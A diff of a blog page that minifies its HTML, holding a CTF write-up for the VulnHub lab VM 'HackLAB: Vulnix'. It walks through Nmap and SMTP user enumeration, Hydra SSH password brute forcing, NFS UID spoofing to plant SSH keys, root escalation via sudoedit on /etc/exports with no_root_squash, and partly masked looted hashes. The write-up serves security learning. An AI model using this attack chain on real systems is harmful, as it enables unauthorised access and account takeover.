@@ -1,45 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8"/>
-    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
-    <meta name="description" content="Personal Weblog"/>
-    <meta content="width=device-width, initial-scale=1" name="viewport"/>
-    <title>Mannthan</title>
-    <link href="/static/images/mannthan-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
-    <script src="/static/js/highlight.min.js"></script>
-    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
-    <script charset="UTF-8" src="/static/js/go.min.js"></script>
-    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/style.md.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
-    <link rel="stylesheet" href="/static/css/github-gist.min.css">
-    <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
-   </head>
-  <body>
-    <div class="header">
-      <table>
-        <tr>
-          <td><a href="/index.html" style="color:#fe4164; font-size:14pt;">🏡 Home </a></td>
-          <td><a href="/archive.html" style="color:#f90; font-size:14pt;">💾 Archive </a></td>
-          <td><a href="/tags.html" style="color:#69359c; font-size:14pt;">🔖 Tags </a></td>
-          <td><a href="/stats.html" style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td>
-        </tr>
-      </table>
-    </div>
-    <div class="body">
-          <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] HackLAB: Vulnix</h1>
-                  <p><a href="/posts/20190919_vulnhub-sedna.html"> « </a>📅 published on <code>20/Sep/2019</code><a href="/posts/20190926_vulnhub-imf.html"> » </a></p>
-                <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
-<p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/hacklab-vulnix,48/">HackLAB: Vulnix</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:  </p>
-<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_vulnix/killchain.png" /></p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
-<p class="nested">1. Here's the Nmap scan result:  </p>
-<pre class="nested"><code># Nmap 7.70 scan initiated Thu Sep 19 17:29:26 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.vulnix/results/192.168.92.177/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.vulnix/results/192.168.92.177/scans/xml/_quick_tcp_nmap.xml 192.168.92.177
+<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>Mannthan</title><link href=/static/images/mannthan-32x32.png sizes=32x32 rel=icon type=image/png><script src=/static/js/highlight.min.js></script><script src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script><link rel=stylesheet href=/static/css/github-gist.min.css><link rel=stylesheet type=text/css href=/static/css/style.md.css media=screen></head><body><div class=header><table><tr><td><a href=/index.html style="color:#fe4164; font-size:14pt;">🏡 Home </a></td><td><a href=/archive.html style="color:#f90; font-size:14pt;">💾 Archive </a></td><td><a href=/tags.html style="color:#69359c; font-size:14pt;">🔖 Tags </a></td><td><a href=/stats.html style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>[VulnHub] HackLAB: Vulnix</h1><p><a href=/posts/20190919_vulnhub-sedna.html> « </a>📅 published on <code>20/Sep/2019</code><a href=/posts/20190926_vulnhub-imf.html> » </a></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested>This is a writeup for VulnHub VM <a href=https://www.vulnhub.com/entry/hacklab-vulnix,48/ >HackLAB: Vulnix</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process: </p><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_vulnhub_vulnix/killchain.png></p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.70 scan initiated Thu Sep 19 17:29:26 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.vulnix/results/192.168.92.177/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.vulnix/results/192.168.92.177/scans/xml/_quick_tcp_nmap.xml 192.168.92.177
 Nmap scan report for 192.168.92.177
 Host is up, received arp-response (0.00090s latency).
 Scanned at 2019-09-19 17:29:27 PDT for 17s
@@ -245,10 +204,7 @@ Host script results:
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Sep 19 17:29:44 2019 -- 1 IP address (1 host up) scanned in 17.41 seconds
-</code></pre>
-
-<p class="nested">2. We perform SMTP user enumeration and find 2 hits:  </p>
-<pre class="nested"><code>smtp-user-enum -M VRFY -U &quot;/usr/share/seclists/Usernames/top-usernames-shortlist.txt&quot; -t 192.168.92.177 -p 25 2&gt;&amp;1
+</code></pre><p class=nested>2. We perform SMTP user enumeration and find 2 hits: </p><pre class=nested><code>smtp-user-enum -M VRFY -U &quot;/usr/share/seclists/Usernames/top-usernames-shortlist.txt&quot; -t 192.168.92.177 -p 25 2&gt;&amp;1
   Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
 
    ----------------------------------------------------------
@@ -271,10 +227,7 @@ Service detection performed. Please report any incorrect results at https://nmap
   2 results.
 
   17 queries in 2 seconds (8.5 queries / sec)
-</code></pre>
-
-<p class="nested">3. We also manually verified presence of user <code>vulnix</code> and <code>user</code>:  </p>
-<pre class="nested"><code>smtp-user-enum -M VRFY -u vulnix -t 192.168.92.177 -p 25 2&gt;&amp;1
+</code></pre><p class=nested>3. We also manually verified presence of user <code>vulnix</code> and <code>user</code>: </p><pre class=nested><code>smtp-user-enum -M VRFY -u vulnix -t 192.168.92.177 -p 25 2&gt;&amp;1
   Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
 
    ----------------------------------------------------------
@@ -317,10 +270,7 @@ smtp-user-enum -M VRFY -u user -t 192.168.92.177 -p 25 2&gt;&amp;1
   1 results.
 
   1 queries in 1 seconds (1.0 queries / sec)
-</code></pre>
-
-<p class="nested">4. Bruteforcing the SSH password for <code>user</code> with <code>rockyou.txt</code> was successful and we can now login to the target:  </p>
-<pre class="nested"><code>hydra -l user -P /usr/share/wordlists/rockyou.txt -e nsr ssh://192.168.92.177
+</code></pre><p class=nested>4. Bruteforcing the SSH password for <code>user</code> with <code>rockyou.txt</code> was successful and we can now login to the target: </p><pre class=nested><code>hydra -l user -P /usr/share/wordlists/rockyou.txt -e nsr ssh://192.168.92.177
   Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
   Hydra (http://www.thc.org/thc-hydra) starting at 2019-09-20 14:09:36
@@ -333,12 +283,7 @@ smtp-user-enum -M VRFY -u user -t 192.168.92.177 -p 25 2&gt;&amp;1
   [ERROR] 9 targets did not resolve or could not be connected
   [ERROR] 16 targets did not complete
   Hydra (http://www.thc.org/thc-hydra) finished at 2019-09-20 14:09:45
-</code></pre>
-
-<p class="nested"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_vulnix/screenshot01.png" />  </p>
-<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
-<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
-<pre class="nested"><code>22/tcp     |  ssh       |  OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+</code></pre><p class=nested><img alt=writeup.enumeration.steps.4.1 src=/static/files/posts_vulnhub_vulnix/screenshot01.png> </p><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>22/tcp     |  ssh       |  OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
 25/tcp     |  smtp      |  Postfix smtpd
 79/tcp     |  finger    |  Linux fingerd
 110/tcp    |  pop3      |  Dovecot pop3d
@@ -355,21 +300,11 @@ smtp-user-enum -M VRFY -u user -t 192.168.92.177 -p 25 2&gt;&amp;1
 50680/tcp  |  mountd    |  1-3 (RPC #100005)
 57819/tcp  |  nlockmgr  |  1-4 (RPC #100021)
 59222/tcp  |  status    |  1 (RPC #100024)
-</code></pre>
-
-<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
-<pre class="nested"><code>ssh: root, user, vulnix
-</code></pre>
-
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
-<p class="nested">1. Nothing useful is found with the <code>user</code> account so we move on for further enumeration. Let's explore NFS shares:  </p>
-<pre class="nested"><code>showmount -e 192.168.92.177
+</code></pre><h4 class="h4 collapsible" onclick=toggle(this);>Users</h4><pre class=nested><code>ssh: root, user, vulnix
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. Nothing useful is found with the <code>user</code> account so we move on for further enumeration. Let's explore NFS shares: </p><pre class=nested><code>showmount -e 192.168.92.177
   Export list for 192.168.92.177:
   /home/vulnix *
-</code></pre>
-
-<p class="nested">2. We create a mount directory <code>./mnt</code>, mount the remote NFS share with NFSv3 so that we can see the UID, create a new user <code>vulnix</code> with the expected UID, change to user <code>vulnix</code>, create a <code>.ssh</code> directory, copy <code>id_rsa.pub</code> to <code>.ssh/authorized_keys</code> and SSH into the target as user <code>vulnix</code>:  </p>
-<pre class="nested"><code>mkdir ./mnt/
+</code></pre><p class=nested>2. We create a mount directory <code>./mnt</code>, mount the remote NFS share with NFSv3 so that we can see the UID, create a new user <code>vulnix</code> with the expected UID, change to user <code>vulnix</code>, create a <code>.ssh</code> directory, copy <code>id_rsa.pub</code> to <code>.ssh/authorized_keys</code> and SSH into the target as user <code>vulnix</code>: </p><pre class=nested><code>mkdir ./mnt/
 mount 192.168.92.177:/home/vulnix ./mnt -o vers=3
 ls -l
 useradd -u 2008 vulnix
@@ -380,13 +315,7 @@ mkdir .ssh/
 cp ./authorized_keys ./.ssh/
 exit
 ssh vulnix@192.168.92.177
-</code></pre>
-
-<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_vulnix/screenshot03.png" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_vulnix/screenshot04.png" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_vulnhub_vulnix/screenshot05.png" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<pre class="nested"><code>vulnix@vulnix&gt; id
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_vulnhub_vulnix/screenshot03.png> </p><p class=nested><img alt=writeup.exploitation.steps.2.2 src=/static/files/posts_vulnhub_vulnix/screenshot04.png> </p><p class=nested><img alt=writeup.exploitation.steps.2.3 src=/static/files/posts_vulnhub_vulnix/screenshot05.png> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>vulnix@vulnix&gt; id
 uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
 vulnix@vulnix&gt;  
 vulnix@vulnix&gt; uname
@@ -407,99 +336,21 @@ vulnix@vulnix&gt; users
 root
 user
 vulnix
-</code></pre>
-
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
-<p class="nested">1. We find that user <code>vulnix</code> is allowed to <code>sudoedit /etc/exports</code> on this target:  </p>
-<pre class="nested"><code>sudo -l
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #3: Privilege Escalation</h2><p class=nested>1. We find that user <code>vulnix</code> is allowed to <code>sudoedit /etc/exports</code> on this target: </p><pre class=nested><code>sudo -l
 cat /etc/exports
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_vulnix/screenshot06.png" />  </p>
-<p class="nested">2. This means we can create a new share and mount it with <code>no_root_squash</code> option:  </p>
-<pre class="nested"><code>sudoedit /etc/exports
+</code></pre><p class=nested><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_vulnhub_vulnix/screenshot06.png> </p><p class=nested>2. This means we can create a new share and mount it with <code>no_root_squash</code> option: </p><pre class=nested><code>sudoedit /etc/exports
 cat /etc/exports
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_vulnix/screenshot07.png" />  </p>
-<p class="nested">3. We have to reboot the target for the <code>/etc/exports</code> changes to take affect:  </p>
-<pre class="nested"><code>showmount -e 192.168.92.177
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_vulnix/screenshot08.png" />  </p>
-<p class="nested">4. We can now repeat the exploitation steps but this time for user <code>root</code> and enable remote SSH access:  </p>
-<pre class="nested"><code>mount 192.168.92.177:/ ./mnt -o vers=3
+</code></pre><p class=nested><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_vulnhub_vulnix/screenshot07.png> </p><p class=nested>3. We have to reboot the target for the <code>/etc/exports</code> changes to take affect: </p><pre class=nested><code>showmount -e 192.168.92.177
+</code></pre><p class=nested><img alt=writeup.privesc.steps.3.1 src=/static/files/posts_vulnhub_vulnix/screenshot08.png> </p><p class=nested>4. We can now repeat the exploitation steps but this time for user <code>root</code> and enable remote SSH access: </p><pre class=nested><code>mount 192.168.92.177:/ ./mnt -o vers=3
 cd ./mnt
 cd root/
 mkdir .ssh/
 cp ~/.ssh/id_rsa.pub ./.ssh/authorized_keys
 ssh root@192.168.92.177
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_vulnix/screenshot09.png" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_vulnhub_vulnix/screenshot10.png" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.4.3" src="/static/files/posts_vulnhub_vulnix/screenshot11.png" />  </p>
-<p class="nested">5. We can now access the flag to complete the challenge:  </p>
-<pre class="nested"><code>cat /root/trophy.txt
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_vulnix/screenshot12.png" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
-<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
-<pre class="nested"><code>root:$6$GpmQGQUN$8kLewzMF4ItmxezcryWqSPrXNRTH5TOQFKKkHjK2NSmrTg95xiYi.l8L.RYUL.8pAsj8s4EGvDy4dvENQ........................
+</code></pre><p class=nested><img alt=writeup.privesc.steps.4.1 src=/static/files/posts_vulnhub_vulnix/screenshot09.png> </p><p class=nested><img alt=writeup.privesc.steps.4.2 src=/static/files/posts_vulnhub_vulnix/screenshot10.png> </p><p class=nested><img alt=writeup.privesc.steps.4.3 src=/static/files/posts_vulnhub_vulnix/screenshot11.png> </p><p class=nested>5. We can now access the flag to complete the challenge: </p><pre class=nested><code>cat /root/trophy.txt
+</code></pre><p class=nested><img alt=writeup.privesc.steps.5.1 src=/static/files/posts_vulnhub_vulnix/screenshot12.png> </p><h2 class="h2 collapsible" onclick=toggle(this);>Loot</h2><h3 class="h3 collapsible" onclick=toggle(this);>Hashes</h3><pre class=nested><code>root:$6$GpmQGQUN$8kLewzMF4ItmxezcryWqSPrXNRTH5TOQFKKkHjK2NSmrTg95xiYi.l8L.RYUL.8pAsj8s4EGvDy4dvENQ........................
 user:$6$gLVDPSY5$CGHDuEBpkC90vX2xFD9NeJC0O9XfhVj9oFVvL8XbTRpBnt/7WJFpADj0zboPTKTqPbOHafZGUd/exj4OZ........................
 vulnix:$6$tMOyhDF2$gExhASDVWJqHYn00.A8XLJb.DvE7bdD6NffAno3iY5zEkJwZ4yDTGMrhdVbkMXV1dlBT00DoGFR7oXbtD........................
-</code></pre>
-
-<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
-<pre class="nested"><code>ssh: user/letm...
-</code></pre>
-
-<h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
-<pre class="nested"><code>cc614640424f5bd60ce5d5264.......
-</code></pre>
-
-<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
-<ul class="nested">
-<li><a href="https://www.vulnhub.com/entry/hacklab-vulnix,48/">https://www.vulnhub.com/entry/hacklab-vulnix,48/</a>  </li>
-<li><a href="https://guif.re/linuxeop">https://guif.re/linuxeop</a>  </li>
-<li><a href="https://blog.christophetd.fr/write-up-vulnix/">https://blog.christophetd.fr/write-up-vulnix/</a>  </li>
-<li><a href="https://rastating.github.io/vulnix-ctf-walkthrough/">https://rastating.github.io/vulnix-ctf-walkthrough/</a>  </li>
-<li><a href="https://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm">https://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm</a>  </li>
-</ul>
-        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p style="text-align:center;">« <a href="/posts/20190919_vulnhub-sedna.html">[VulnHub] hackfest2016: Sedna...</a> « | » <a href="/posts/20190926_vulnhub-imf.html">[VulnHub] IMF: 1...</a> »</p>
-            </div>
-    <script>hljs.initHighlightingOnLoad();</script>
-    <script>hljs.initLineNumbersOnLoad();</script>
-    <script>
-      function toggle(elem) {
-        elem.classList.toggle("expanded");
-        var ish2=false; var ish3=false; var ish4=false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
-        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
-        var sibling = elem.nextElementSibling;
-        while (sibling) {
-          if (ish2 && sibling.classList.contains("h2")) {
-            sibling.classList.toggle("active");
-            break;
-          }
-          if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
-            sibling.classList.toggle("active");
-            break;
-          }
-          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
-            sibling.classList.toggle("active");
-            break;
-          }
-          if (sibling.classList.contains("collapsible")) {
-            sibling.classList.toggle("expanded");
-          }
-          sibling.classList.toggle("active");
-          sibling = sibling.nextElementSibling;
-        }
-      }
-    </script>
-    <div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div>
-  </body>
-</html>
+</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Credentials</h3><pre class=nested><code>ssh: user/letm...
+</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Flags</h3><pre class=nested><code>cc614640424f5bd60ce5d5264.......
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://www.vulnhub.com/entry/hacklab-vulnix,48/ >https://www.vulnhub.com/entry/hacklab-vulnix,48/</a> </li><li><a href=https://guif.re/linuxeop>https://guif.re/linuxeop</a> </li><li><a href=https://blog.christophetd.fr/write-up-vulnix/ >https://blog.christophetd.fr/write-up-vulnix/</a> </li><li><a href=https://rastating.github.io/vulnix-ctf-walkthrough/ >https://rastating.github.io/vulnix-ctf-walkthrough/</a> </li><li><a href=https://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm>https://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20190919_vulnhub-sedna.html>[VulnHub] hackfest2016: Sedna...</a> « | » <a href=/posts/20190926_vulnhub-imf.html>[VulnHub] IMF: 1...</a> »</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div></body></html>
